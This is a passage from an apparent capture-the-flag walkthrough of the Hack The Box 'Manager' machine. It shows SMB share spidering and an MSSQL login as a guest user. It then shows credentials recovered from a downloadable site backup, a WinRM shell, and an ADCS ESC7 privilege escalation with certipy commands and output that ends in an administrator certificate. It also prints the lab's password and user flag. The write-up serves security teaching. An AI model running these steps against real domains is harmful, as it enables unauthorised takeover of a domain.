</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$netexec smb 10.10.11.236 -u <span style="color:#e6db74">&#39;Operator&#39;</span> -p <span style="color:#e6db74">&#39;operator&#39;</span> -M spider_plus --share <span style="color:#e6db74">&#39;SYSVOL&#39;</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [+] manager.htb\Operator:operator
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] Started module spidering_plus with the following options:
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]  DOWNLOAD_FLAG: False
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]     STATS_FLAG: True
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] EXCLUDE_FILTER: [&#39;print$&#39;, &#39;ipc$&#39;]
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]   EXCLUDE_EXTS: [&#39;ico&#39;, &#39;lnk&#39;]
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [*] Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [+] Saved share-file metadata to &#34;/tmp/nxc_hosted/nxc_spider_plus/10.10.11.236.json&#34;.
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] SMB Filtered Shares:  1
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] Total folders found:  19
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] Total files found:    5
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] File size average:    1.77 KB
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] File size min:        22 B
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] File size max:        4.82 KB
</span></span></code></pre></div><p>Now let&rsquo;s take a look at what it found</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat netlogon.json
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    &#34;NETLOGON&#34;: {},
</span></span><span style="display:flex;"><span>    &#34;SYSVOL&#34;: {
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-09-28 18:21:33&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:19:12&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-09-28 18:21:33&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;23 B&#34;
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-09-28 18:21:33&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:19:12&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-09-28 18:21:33&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;1.23 KB&#34;
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-07-27 06:29:46&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:29:46&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-07-27 06:29:46&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;2.72 KB&#34;
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-07-27 08:31:38&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:19:12&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-07-27 08:31:38&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;22 B&#34;
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-07-27 08:31:38&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:19:12&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-07-27 08:31:38&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;4.82 KB&#34;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>And for the SYSVOL share</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat sysvol.json
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    &#34;NETLOGON&#34;: {},
</span></span><span style="display:flex;"><span>    &#34;SYSVOL&#34;: {
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-09-28 18:21:33&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:19:12&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-09-28 18:21:33&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;23 B&#34;
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-09-28 18:21:33&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:19:12&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-09-28 18:21:33&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;1.23 KB&#34;
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-07-27 06:29:46&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:29:46&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-07-27 06:29:46&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;2.72 KB&#34;
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-07-27 08:31:38&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:19:12&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-07-27 08:31:38&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;22 B&#34;
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        &#34;manager.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;: {
</span></span><span style="display:flex;"><span>            &#34;atime_epoch&#34;: &#34;2023-07-27 08:31:38&#34;,
</span></span><span style="display:flex;"><span>            &#34;ctime_epoch&#34;: &#34;2023-07-27 06:19:12&#34;,
</span></span><span style="display:flex;"><span>            &#34;mtime_epoch&#34;: &#34;2023-07-27 08:31:38&#34;,
</span></span><span style="display:flex;"><span>            &#34;size&#34;: &#34;4.82 KB&#34;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Nothing really interesting here. We remember that our <code>nmap</code> scans showed an MSSQL instance. Let&rsquo;s try to log in with the Operator user</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$mssqlclient.py Operator@10.10.11.236 -windows-auth
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Password:
</span></span><span style="display:flex;"><span>[*] Encryption required, switching to TLS
</span></span><span style="display:flex;"><span>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
</span></span><span style="display:flex;"><span>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
</span></span><span style="display:flex;"><span>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
</span></span><span style="display:flex;"><span>[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
</span></span><span style="display:flex;"><span>[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
</span></span><span style="display:flex;"><span>[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
</span></span><span style="display:flex;"><span>[!] Press help for extra shell commands
</span></span><span style="display:flex;"><span>SQL (MANAGER\Operator  guest@master)&gt;
</span></span></code></pre></div><p>We get in! Let&rsquo;s see what databases are available</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>SQL (MANAGER\Operator  guest@master)&gt; SELECT name FROM master.dbo.sysdatabases
</span></span><span style="display:flex;"><span>name
</span></span><span style="display:flex;"><span>------
</span></span><span style="display:flex;"><span>master
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>tempdb
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>model
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>msdb
</span></span></code></pre></div><p>Looks like just the default databases. Let&rsquo;s see if we can execute commands with <code>xp_cmdshell</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>SQL (MANAGER\Operator  guest@master)&gt; xp_cmdshell whoami
</span></span><span style="display:flex;"><span>ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object &#39;xp_cmdshell&#39;, database &#39;mssqlsystemresource&#39;, schema &#39;sys&#39;.
</span></span><span style="display:flex;"><span>SQL (MANAGER\Operator  guest@master)&gt;
</span></span></code></pre></div><p>Let&rsquo;s see if we can enable <code>xp_cmdshell</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>SQL (MANAGER\Operator  guest@master)&gt; sp_configure &#39;show advanced options&#39;, 1
</span></span><span style="display:flex;"><span>ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
</span></span><span style="display:flex;"><span>SQL (MANAGER\Operator  guest@master)&gt;
</span></span></code></pre></div><p>Unfortunately we don&rsquo;t have permissions. After trying a bunch of different commands attempting the usual attack methods, we don&rsquo;t find much. We do have the <code>xp_dirtree</code> command in which we can browse the file system. We are able to find a <code>web.config</code> archive</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree C:\inetpub\wwwroot
</span></span><span style="display:flex;"><span>subdirectory                      depth   file
</span></span><span style="display:flex;"><span>-------------------------------   -----   ----
</span></span><span style="display:flex;"><span>about.html                            1      1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>contact.html                          1      1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>css                                   1      0
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>images                                1      0
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>index.html                            1      1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>js                                    1      0
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>service.html                          1      1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>web.config                            1      1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>website-backup-27-07-23-old.zip       1      1
</span></span></code></pre></div><p><em>Note: If you performed IIS short-name scanning, you would have also seen part of the web.config archive file in the results</em></p>
<p>We simply append the backup archive name to the URL and we are able to download it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http://manager.htb/website-backup-27-07-23-old.zip
</span></span></span></code></pre></div><p>If we unzip it, we will find <code>.old-conf.xml</code> which contains credentials for the Raven user</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat .old-conf.xml
</span></span><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span style="display:flex;"><span>&lt;ldap-conf xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;&gt;
</span></span><span style="display:flex;"><span>   &lt;server&gt;
</span></span><span style="display:flex;"><span>      &lt;host&gt;dc01.manager.htb&lt;/host&gt;
</span></span><span style="display:flex;"><span>      &lt;open-port enabled=&#34;true&#34;&gt;389&lt;/open-port&gt;
</span></span><span style="display:flex;"><span>      &lt;secure-port enabled=&#34;false&#34;&gt;0&lt;/secure-port&gt;
</span></span><span style="display:flex;"><span>      &lt;search-base&gt;dc=manager,dc=htb&lt;/search-base&gt;
</span></span><span style="display:flex;"><span>      &lt;server-type&gt;microsoft&lt;/server-type&gt;
</span></span><span style="display:flex;"><span>      &lt;access-user&gt;
</span></span><span style="display:flex;"><span>         &lt;user&gt;raven@manager.htb&lt;/user&gt;
</span></span><span style="display:flex;"><span>         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;
</span></span><span style="display:flex;"><span>      &lt;/access-user&gt;
</span></span><span style="display:flex;"><span>      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;
</span></span><span style="display:flex;"><span>   &lt;/server&gt;
</span></span><span style="display:flex;"><span>   &lt;search type=&#34;full&#34;&gt;
</span></span><span style="display:flex;"><span>      &lt;dir-list&gt;
</span></span><span style="display:flex;"><span>         &lt;dir&gt;cn=Operator1,CN=users,dc=manager,dc=htb&lt;/dir&gt;
</span></span><span style="display:flex;"><span>      &lt;/dir-list&gt;
</span></span><span style="display:flex;"><span>   &lt;/search&gt;
</span></span><span style="display:flex;"><span>&lt;/ldap-conf&gt;
</span></span></code></pre></div><p>Let&rsquo;s try to WinRM into the machine now</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$evil-winrm -i 10.10.11.236 -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Raven\Documents&gt;
</span></span></code></pre></div><p>Let&rsquo;s grab the user flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Raven\Desktop&gt; type user.txt
</span></span><span style="display:flex;"><span>e0daf06fb04f9f8ff4b84c093646aaae
</span></span></code></pre></div><p>Going through my normal enumeration and I find absolutely nothing. Eventually I stumble upon ADCS and use <code>certipy</code> to find any vulnerabilities</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$certipy find -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -dc-ip 10.10.11.236 -stdout -vulnerable
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Finding certificate templates
</span></span><span style="display:flex;"><span>[*] Found 33 certificate templates
</span></span><span style="display:flex;"><span>[*] Finding certificate authorities
</span></span><span style="display:flex;"><span>[*] Found 1 certificate authority
</span></span><span style="display:flex;"><span>[*] Found 11 enabled certificate templates
</span></span><span style="display:flex;"><span>[*] Trying to get CA configuration for &#39;manager-DC01-CA&#39; via CSRA
</span></span><span style="display:flex;"><span>[*] Got CA configuration for &#39;manager-DC01-CA&#39;
</span></span><span style="display:flex;"><span>[*] Enumeration output:
</span></span><span style="display:flex;"><span>Certificate Authorities
</span></span><span style="display:flex;"><span>  0
</span></span><span style="display:flex;"><span>    CA Name                             : manager-DC01-CA
</span></span><span style="display:flex;"><span>    DNS Name                            : dc01.manager.htb
</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2122-07-27 10:31:04+00:00
</span></span><span style="display:flex;"><span>    Web Enrollment                      : Disabled
</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
</span></span><span style="display:flex;"><span>    Enforce Encryption for Requests     : Enabled
</span></span><span style="display:flex;"><span>    Permissions
</span></span><span style="display:flex;"><span>      Owner                             : MANAGER.HTB\Administrators
</span></span><span style="display:flex;"><span>      Access Rights
</span></span><span style="display:flex;"><span>        Enroll                          : MANAGER.HTB\Operator
</span></span><span style="display:flex;"><span>                                          MANAGER.HTB\Authenticated Users
</span></span><span style="display:flex;"><span>                                          MANAGER.HTB\Raven
</span></span><span style="display:flex;"><span>        ManageCertificates              : MANAGER.HTB\Administrators
</span></span><span style="display:flex;"><span>                                          MANAGER.HTB\Domain Admins
</span></span><span style="display:flex;"><span>                                          MANAGER.HTB\Enterprise Admins
</span></span><span style="display:flex;"><span>        ManageCa                        : MANAGER.HTB\Administrators
</span></span><span style="display:flex;"><span>                                          MANAGER.HTB\Domain Admins
</span></span><span style="display:flex;"><span>                                          MANAGER.HTB\Enterprise Admins
</span></span><span style="display:flex;"><span>                                          MANAGER.HTB\Raven
</span></span><span style="display:flex;"><span>    [!] Vulnerabilities
</span></span><span style="display:flex;"><span>      ESC7                              : &#39;MANAGER.HTB\\Raven&#39; has dangerous permissions
</span></span><span style="display:flex;"><span>Certificate Templates                   : [!] Could not find any certificate templates
</span></span></code></pre></div><p>Looks like the Raven user is able to do the <code>ESC7</code> exploit. This attack is when a user utilizes the <code>Manage Certificate Authority</code> rights to add themselves as a new officer and then grant themselves <code>Manage Certificates</code> access rights. Then, the user can request a certificate via the <code>Subordinate Certificate Authority (SubCA)</code> template to escalate privileges.</p>
<p>First we need to add <code>raven</code> as a new officer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$certipy ca -ca manager-dc01-ca -dc-ip 10.10.11.236 -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -add-officer raven
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Successfully added officer &#39;Raven&#39; on &#39;manager-dc01-ca&#39;
</span></span></code></pre></div><p>We also need to enable the <code>SubCA</code> template:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$certipy ca -ca manager-dc01-ca -dc-ip 10.10.11.236 -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -enable-template SubCA
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Successfully enabled &#39;SubCA&#39; on &#39;manager-dc01-ca&#39;
</span></span></code></pre></div><p>Then, we have to initiate a certificate request using the <code>SubCA template</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$certipy req -ca manager-DC01-CA -dc-ip 10.10.11.236 -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -template SubCA -target dc01.manager.htb -upn administrator@manager.htb
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Requesting certificate via RPC
</span></span><span style="display:flex;"><span>[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
</span></span><span style="display:flex;"><span>[*] Request ID is 19
</span></span><span style="display:flex;"><span>Would you like to save the private key? (y/N) y
</span></span><span style="display:flex;"><span>[*] Saved private key to 19.key
</span></span><span style="display:flex;"><span>[-] Failed to request certificate
</span></span></code></pre></div><p>The request will fail, this is expected. The important part is that we select <code>yes</code> to save the private key and note down the ID, which is 19 in this case. Now we reissue the request with the ID we found</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$certipy ca -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request <span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Successfully issued certificate
</span></span></code></pre></div><p><em>Note: If you got an error when requesting the certificate along the lines of  &ldquo;Got access denied trying to issue certificate&rdquo;, then you just need to reset the box</em></p>
<p>Now we retrieve the request by the number <code>19</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$certipy req -u raven -p <span style="color:#e6db74">&#39;R4v3nBe5tD3veloP3r!123&#39;</span> -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve <span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Rerieving certificate with ID 19
</span></span><span style="display:flex;"><span>[*] Successfully retrieved certificate
</span></span><span style="display:flex;"><span>[*] Got certificate with UPN &#39;administrator@manager.htb&#39;
</span></span><span style="display:flex;"><span>[*] Certificate has no object SID
</span></span><span style="display:flex;"><span>[*] Loaded private key from &#39;19.key&#39;
</span></span><span style="display:flex;"><span>[*] Saved certificate and private key to &#39;administrator.pfx&#39;
</span></span></code></pre></div><p>Now we can use the <code>.pfx</code> file to authenticate as the <code>administrator</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$certipy auth -pfx administrator.pfx
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Using principal: administrator@manager.htb
